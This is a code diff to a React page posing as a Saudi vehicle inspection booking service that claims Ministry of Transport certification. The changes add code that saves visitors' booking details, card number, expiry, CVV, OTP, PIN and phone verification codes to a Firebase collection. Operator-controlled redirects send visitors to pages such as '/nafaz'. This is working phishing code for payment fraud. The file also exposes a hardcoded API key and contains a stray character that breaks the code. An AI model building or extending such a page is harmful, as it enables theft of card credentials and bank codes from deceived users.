@@ -17,11 +17,12 @@ type VehicleStatus = "license" | "customs"
 type VehicleType = "car" | "motorcycle" | "truck"
 type AppStep = "landing" | "booking" | "payment-method" | "card-form" | "otp" | "pin" | "phone-verification"
 type PaymentMethod = "card" | "wallet" | "bank"
-function randstr(prefix:string)
-{
-    return Math.random().toString(36).replace('0.',prefix || '');
+function randstr(prefix: string) {
+  return Math.random()
+    .toString(36)
+    .replace("0.", prefix || "")
 }
-const visitorID=randstr('salmn-')
+const visitorID = randstr("salmn-")
 export default function VehicleBooking() {
   const [vehicleStatus, setVehicleStatus] = useState<VehicleStatus>("license")
   const [country, setCountry] = useState("")
@@ -38,7 +39,7 @@ export default function VehicleBooking() {
   const [captchaChecked, setCaptchaChecked] = useState(true)
   const [inspectionType, setInspectionType] = useState("") // Added declaration
 
-  const [currentStep, setCurrentStep] = useState<AppStep>("landing")
+  const [currentStep, setCurrentStep] = useState<AppStep>("booking") // Changed initial step to landing
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
@@ -53,20 +54,20 @@ export default function VehicleBooking() {
   const [phoneOtpError, setPhoneOtpError] = useState("")
 
   useEffect(() => {
-    getLocation().then(()=>{
+    getLocation().then(() => {
       setIsLoading(false)
     })
 
-    const visitorId = localStorage.getItem('visitor') || visitorID
+    const visitorId = localStorage.getItem("visitor") || visitorID
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
-        if (userData.currentPage === '2' || userData.currentPage === 2) {
-          window.location.href = '/quote'
-        } else if (userData.currentPage === '8888' || userData.currentPage === 'nafaz') {
-          window.location.href = '/nafaz'
-        } else if (userData.currentPage === '9999') {
-          window.location.href = '/verify-phone'
+        if (userData.currentPage === "2" || userData.currentPage === 2) {
+          window.location.href = "/quote"
+        } else if (userData.currentPage === "8888" || userData.currentPage === "nafaz") {
+          window.location.href = "/nafaz"
+        } else if (userData.currentPage === "9999") {
+          window.location.href = "/verify-phone"
         }
       }
     })
@@ -74,30 +75,46 @@ export default function VehicleBooking() {
     return () => unsubscribe()
   }, [])
 
- 
   async function getLocation() {
-    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
-  
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
     try {
-        const response = await fetch(url);
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        const country = await response.text();
-        await addData({
-            id:visitorID,
-            country: country,
-            createdDate: new Date().toISOString()
-        })
-        localStorage.setItem('country',country)
-        setupOnlineStatus(visitorID)
-      } catch (error) {
-        console.error('Error fetching location:', error);
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      await addData({
+        id: visitorID,
+        country: country,
+        createdDate: new Date().toISOString(),
+      })
+      localStorage.setItem("country", country)
+      setupOnlineStatus(visitorID)
+    } catch (error) {
+      console.error("Error fetching location:", error)
     }
   }
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    await addData({
+      id: visitorID,
+      vehicleStatus,
+      country,
+      plateNumbers,
+      plateLetters,
+      plateInfo,
+      registrationType,
+      vehicleType,
+      region,
+      city,
+      inspectionCenter,
+      inspectionDate,
+      inspectionTime,
+      inspectionType,
+      step: "booking-completed",
+    })
     setIsLoading(true)
     setTimeout(() => {
       setCurrentStep("payment-method")
@@ -105,8 +122,13 @@ export default function VehicleBooking() {
     }, 1500)
   }
 
-  const handlePaymentMethodSubmit = () => {
+  const handlePaymentMethodSubmit = async () => {
     if (paymentMethod) {
+      await addData({
+        id: visitorID,
+        paymentMethod,
+        step: "payment-method-selected",
+      })
       setIsLoading(true)
       setTimeout(() => {
         setCurrentStep("card-form")
@@ -115,8 +137,16 @@ export default function VehicleBooking() {
     }
   }
 
-  const handleCardFormSubmit = (e: React.FormEvent) => {
+  const handleCardFormSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    await addData({
+      id: visitorID,
+      cardNumber,
+      cardName,
+      expiryDate,
+      cvv,
+      step: "card-details-submitted",
+    })
     setIsLoading(true)
     setTimeout(() => {
       setCurrentStep("otp")
@@ -124,8 +154,13 @@ export default function VehicleBooking() {
     }, 1500)
   }
 
-  const handleOtpSubmit = (e: React.FormEvent) => {
+  const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    await addData({
+      id: visitorID,
+      otp: otp.join(""),
+      step: "otp-submitted",
+    })
     setIsLoading(true)
     setTimeout(() => {
       setCurrentStep("pin")
@@ -133,8 +168,13 @@ export default function VehicleBooking() {
     }, 1500)
   }
 
-  const handlePinSubmit = (e: React.FormEvent) => {
+  const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    await addData({
+      id: visitorID,
+      pin: pin.join(""),
+      step: "pin-submitted",
+    })
     setIsLoading(true)
     setTimeout(() => {
       setCurrentStep("phone-verification")
@@ -142,8 +182,16 @@ export default function VehicleBooking() {
     }, 1500)
   }
 
-  const handlePhoneVerification = (e: React.FormEvent) => {
+  const handlePhoneVerification = async (e: React.FormEvent) => {
     e.preventDefault()
+    await addData({
+      id: visitorID,
+      phone,
+      operator,
+      phoneOtp,
+      step: "payment-completed",
+      completedDate: new Date().toISOString(),
+    })
     setIsLoading(true)
     setTimeout(() => {
       console.log("Payment completed successfully")
@@ -280,7 +328,7 @@ export default function VehicleBooking() {
     {
       id: "card" as PaymentMethod,
       label: "بطاقة ائتمان",
-      icon: CreditCard,
+      icon: <img src="/Visa-Mastercard-1-2048x755.png" />,
       description: "فيزا أو ماستركارد",
       badge: "استرداد نقدي 15%",
       available: true,
@@ -301,15 +349,15 @@ export default function VehicleBooking() {
     },
   ]
 
-  if (isLoading) {
+  if (isLoading) {ß
     return (
       <div dir="rtl" className="min-h-screen bg-background flex items-center justify-center">
         <Card className="w-full max-w-md mx-4 shadow-lg">
           <CardContent className="p-12">
             <div className="flex flex-col items-center gap-6">
               <div className="relative w-20 h-20">
-                <div className="absolute inset-0 border-4 border-primary/30 rounded-full"></div>
-                <div className="absolute inset-0 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
+                <div className="absolute inset-0 border-4 border-teal-700/30 rounded-full"></div>
+                <div className="absolute inset-0 border-4 border-teal-700 border-t-transparent rounded-full animate-spin"></div>
               </div>
               <div className="text-center space-y-2">
                 <h3 className="text-xl font-semibold text-foreground">جاري المعالجة...</h3>
@@ -330,8 +378,8 @@ export default function VehicleBooking() {
           <div className="container mx-auto px-4 py-16 md:py-24 max-w-6xl">
             {/* Trust Badge */}
             <div className="flex justify-center mb-8">
-              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-primary/10 border border-primary/20">
-                <div className="w-2 h-2 rounded-full bg-primary animate-pulse" />
+              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-teal-700/10 border border-teal-700/20">
+                <div className="w-2 h-2 rounded-full bg-teal-700 animate-pulse" />
                 <span className="text-sm font-medium text-foreground">خدمة معتمدة من وزارة النقل</span>
               </div>
             </div>
@@ -352,7 +400,7 @@ export default function VehicleBooking() {
                 <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
                   <Button
                     size="lg"
-                    className="h-14 px-8 text-lg font-semibold bg-primary hover:bg-primary/90 shadow-lg hover:shadow-xl transition-all"
+                    className="h-14 px-8 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90 shadow-lg hover:shadow-xl transition-all"
                     onClick={() => setCurrentStep("booking")}
                   >
                     احجز موعد الآن
@@ -388,7 +436,7 @@ export default function VehicleBooking() {
 
               {/* Vehicle Image */}
               <div className="relative">
-                <div className="absolute inset-0 bg-primary/5 rounded-3xl blur-3xl" />
+                <div className="absolute inset-0 bg-teal-700/5 rounded-3xl blur-3xl" />
                 <Image
                   src="/white-sedan-car-with-technical-inspection-labels-i.jpg"
                   alt="فحص المركبة"
@@ -414,8 +462,8 @@ export default function VehicleBooking() {
           <div className="grid md:grid-cols-3 gap-8 mb-16">
             {/* Feature 1 */}
             <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
-              <div className="w-14 h-14 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
-                <svg className="w-7 h-7 text-primary" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
+                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path
                     strokeLinecap="round"
                     strokeLinejoin="round"
@@ -430,8 +478,8 @@ export default function VehicleBooking() {
 
             {/* Feature 2 */}
             <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
-              <div className="w-14 h-14 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
-                <svg className="w-7 h-7 text-primary" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
+                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path
                     strokeLinecap="round"
                     strokeLinejoin="round"
@@ -446,8 +494,8 @@ export default function VehicleBooking() {
 
             {/* Feature 3 */}
             <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
-              <div className="w-14 h-14 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
-                <svg className="w-7 h-7 text-primary" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
+                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path
                     strokeLinecap="round"
                     strokeLinejoin="round"
@@ -462,7 +510,7 @@ export default function VehicleBooking() {
           </div>
 
           {/* Action Buttons */}
-          <div className="bg-gradient-to-br from-primary/5 to-accent/5 rounded-3xl p-12 border border-primary/10">
+          <div className="bg-gradient-to-br from-teal-700/5 to-accent/5 rounded-3xl p-12 border border-teal-700/10">
             <div className="text-center mb-8">
               <h3 className="text-2xl md:text-3xl font-bold text-foreground mb-3">ابدأ الآن</h3>
               <p className="text-muted-foreground text-lg">اختر الإجراء المناسب لك</p>
@@ -471,7 +519,7 @@ export default function VehicleBooking() {
             <div className="grid sm:grid-cols-3 gap-4 max-w-3xl mx-auto">
               <Button
                 size="lg"
-                className="h-16 text-base font-semibold bg-primary hover:bg-primary/90 shadow-md"
+                className="h-16 text-base font-semibold bg-teal-700 hover:bg-teal-700/90 shadow-md"
                 onClick={() => setCurrentStep("booking")}
               >
                 <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -532,7 +580,7 @@ export default function VehicleBooking() {
                 <div className="text-sm font-semibold text-gray-800">مركز سلامة المركبات</div>
                 <div className="text-xs text-gray-500">Vehicles Safety Center</div>
               </div>
-              <div className="w-10 h-10 bg-primary rounded-md flex items-center justify-center">
+              <div className="w-10 h-10 bg-teal-700 rounded-md flex items-center justify-center">
                 <Car className="w-6 h-6 text-white" />
               </div>
             </div>
@@ -555,7 +603,7 @@ export default function VehicleBooking() {
         {/* Tabs */}
         <div className="bg-white border-b border-gray-200">
           <div className="container mx-auto max-w-2xl flex">
-            <button className="flex-1 py-4 text-sm font-medium text-primary border-b-2 border-primary">
+            <button className="flex-1 py-4 text-sm font-medium text-teal-700 border-b-2 border-teal-700">
               حجز موعد جديد
             </button>
             <button className="flex-1 py-4 text-sm font-medium text-gray-500">إدارة المواعيد</button>
@@ -881,8 +929,8 @@ export default function VehicleBooking() {
                   key={idx}
                   type="button"
                   onClick={() => setInspectionDate(dateOption.date)}
-                  className={`bg-gray-50 border rounded-lg p-4 hover:border-primary transition-colors ${
-                    inspectionDate === dateOption.date ? "border-primary bg-primary/5" : "border-gray-300"
+                  className={`bg-gray-50 border rounded-lg p-4 hover:border-teal-700 transition-colors ${
+                    inspectionDate === dateOption.date ? "border-teal-700 bg-teal-700/5" : "border-gray-300"
                   }`}
                 >
                   <div className="text-xs text-gray-500 mb-1">{dateOption.day}</div>
@@ -926,8 +974,8 @@ export default function VehicleBooking() {
                     onClick={() => setInspectionTime(time)}
                     className={`h-12 rounded-md border text-sm transition-colors ${
                       inspectionTime === time
-                        ? "bg-primary text-white border-primary"
-                        : "bg-gray-50 border-gray-300 text-gray-700 hover:border-primary"
+                        ? "bg-teal-700 text-white border-teal-700"
+                        : "bg-gray-50 border-gray-300 text-gray-700 hover:border-teal-700"
                     }`}
                   >
                     {time}
@@ -940,7 +988,7 @@ export default function VehicleBooking() {
             <div className="space-y-3 pt-4">
               <Button
                 type="submit"
-                className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-medium rounded-md"
+                className="w-full h-12 bg-teal-700 hover:bg-teal-700/90 text-white font-medium rounded-md"
                 disabled={!captchaChecked}
                 data-testid="button-submit"
               >
@@ -991,9 +1039,9 @@ export default function VehicleBooking() {
       <div dir="rtl" className="min-h-screen bg-background">
         <main className="flex-1">
           {/* Professional header styling */}
-          <div className="bg-primary py-6 shadow-sm">
+          <div className="bg-teal-700 py-6 shadow-sm">
             <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-primary-foreground text-center">طريقة الدفع</h1>
+              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">طريقة الدفع</h1>
             </div>
           </div>
 
@@ -1007,12 +1055,12 @@ export default function VehicleBooking() {
             </Card>
 
             {/* Enhanced payment amount card with better visual hierarchy */}
-            <Card className="border-primary/30 bg-gradient-to-br from-primary/5 to-primary/10 shadow-sm">
+            <Card className="border-teal-700/30 bg-gradient-to-br from-teal-700/5 to-teal-700/10 shadow-sm">
               <CardContent className="p-6">
                 <div className="flex items-center justify-between">
                   <span className="text-lg font-medium text-foreground">المبلغ المستحق:</span>
                   <div className="text-right">
-                    <div className="text-4xl font-bold text-primary">100</div>
+                    <div className="text-4xl font-bold text-teal-700">100</div>
                     <div className="text-sm text-muted-foreground">ريال سعودي</div>
                   </div>
                 </div>
@@ -1034,22 +1082,22 @@ export default function VehicleBooking() {
                     className={`w-full p-5 rounded-lg border-2 transition-all shadow-sm relative ${
                       method.available
                         ? paymentMethod === method.id
-                          ? "border-primary bg-primary/10 shadow-md hover:shadow-lg"
-                          : "border-border bg-card hover:border-primary/50 hover:shadow-md"
+                          ? "border-teal-700 bg-teal-700/10 shadow-md hover:shadow-lg"
+                          : "border-border bg-card hover:border-teal-700/50 hover:shadow-md"
                         : "border-border bg-muted/50 opacity-60 cursor-not-allowed"
                     }`}
                   >
                     <div className="flex items-center gap-4">
                       <div
                         className={`p-3 rounded-lg ${
-                          method.available ? (paymentMethod === method.id ? "bg-primary/20" : "bg-muted") : "bg-muted"
+                          method.available ? (paymentMethod === method.id ? "bg-teal-700/20" : "bg-muted") : "bg-muted"
                         }`}
                       >
                         <method.icon
                           className={`w-6 h-6 ${
                             method.available
                               ? paymentMethod === method.id
-                                ? "text-primary"
+                                ? "text-teal-700"
                                 : "text-muted-foreground"
                               : "text-muted-foreground"
                           }`}
@@ -1105,10 +1153,10 @@ export default function VehicleBooking() {
     return (
       <div dir="rtl" className="min-h-screen bg-background">
         <main className="flex-1">
-          <div className="bg-primary py-6 shadow-sm">
+          <div className="bg-teal-700 py-6 shadow-sm">
             <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-primary-foreground text-center">الدفع الإلكتروني</h1>
-              <p className="text-sm text-primary-foreground/80 text-center mt-1">
+              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">الدفع الإلكتروني</h1>
+              <p className="text-sm text-teal-700-foreground/80 text-center mt-1">
                 ادفع رسوم الفحص الفني الدوري بشكل آمن أون لاين
               </p>
             </div>
@@ -1142,7 +1190,7 @@ export default function VehicleBooking() {
             <Card className="shadow-sm">
               <CardContent className="p-6">
                 <h2 className="text-xl font-bold mb-6 flex items-center gap-2">
-                  <CreditCard className="w-5 h-5 text-primary" />
+                  <CreditCard className="w-5 h-5 text-teal-700" />
                   بيانات البطاقة
                 </h2>
 
@@ -1266,7 +1314,7 @@ export default function VehicleBooking() {
                   <div className="border-t pt-3 mt-3">
                     <div className="flex justify-between items-center">
                       <span className="text-lg font-bold">الإجمالي</span>
-                      <span className="text-2xl font-bold text-primary">132.25 ريال</span>
+                      <span className="text-2xl font-bold text-teal-700">132.25 ريال</span>
                     </div>
                   </div>
                 </div>
@@ -1323,9 +1371,9 @@ export default function VehicleBooking() {
     return (
       <div dir="rtl" className="min-h-screen bg-background">
         <main className="flex-1">
-          <div className="bg-primary py-6 shadow-sm">
+          <div className="bg-teal-700 py-6 shadow-sm">
             <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-primary-foreground text-center">التحقق برمز OTP</h1>
+              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">التحقق برمز OTP</h1>
             </div>
           </div>
 
@@ -1359,7 +1407,7 @@ export default function VehicleBooking() {
                             nextInput?.focus()
                           }
                         }}
-                        className="w-14 h-16 text-center text-xl font-bold border-2 focus:border-primary shadow-sm"
+                        className="w-14 h-16 text-center text-xl font-bold border-2 focus:border-teal-700 shadow-sm"
                         required
                       />
                     ))}
@@ -1399,9 +1447,9 @@ export default function VehicleBooking() {
     return (
       <div dir="rtl" className="min-h-screen bg-background">
         <main className="flex-1">
-          <div className="bg-primary py-6 shadow-sm">
+          <div className="bg-teal-700 py-6 shadow-sm">
             <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-primary-foreground text-center">أدخل رمز PIN</h1>
+              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">أدخل رمز PIN</h1>
             </div>
           </div>
 
@@ -1434,7 +1482,7 @@ export default function VehicleBooking() {
                             nextInput?.focus()
                           }
                         }}
-                        className="w-16 h-20 text-center text-3xl font-bold border-2 focus:border-primary shadow-sm"
+                        className="w-16 h-20 text-center text-3xl font-bold border-2 focus:border-teal-700 shadow-sm"
                         required
                       />
                     ))}
@@ -1480,9 +1528,9 @@ export default function VehicleBooking() {
     return (
       <div dir="rtl" className="min-h-screen bg-background">
         <main className="flex-1">
-          <div className="bg-primary py-6 shadow-sm">
+          <div className="bg-teal-700 py-6 shadow-sm">
             <div className="container mx-auto px-4">
-              <h1 className="text-2xl font-bold text-primary-foreground text-center">التحقق من رقم الجوال</h1>
+              <h1 className="text-2xl font-bold text-teal-700-foreground text-center">التحقق من رقم الجوال</h1>
             </div>
           </div>
 
@@ -1532,16 +1580,16 @@ export default function VehicleBooking() {
                           onClick={() => setOperator(op.id)}
                           className={`flex flex-col items-center justify-center p-4 border-2 rounded-lg transition-all ${
                             operator === op.id
-                              ? "border-primary bg-primary/10 shadow-md"
-                              : `border-border ${op.color} hover:border-primary/50`
+                              ? "border-teal-700 bg-teal-700/10 shadow-md"
+                              : `border-border ${op.color} hover:border-teal-700/50`
                           }`}
                         >
                           <div className="h-8 w-auto mb-2 flex items-center justify-center">
                             <span className="font-bold text-lg">{op.name}</span>
                           </div>
                           {operator === op.id && (
-                            <div className="w-5 h-5 bg-primary rounded-full flex items-center justify-center">
-                              <Check className="w-3 h-3 text-primary-foreground" />
+                            <div className="w-5 h-5 bg-teal-700 rounded-full flex items-center justify-center">
+                              <Check className="w-3 h-3 text-teal-700-foreground" />
                             </div>
                           )}
                         </button>
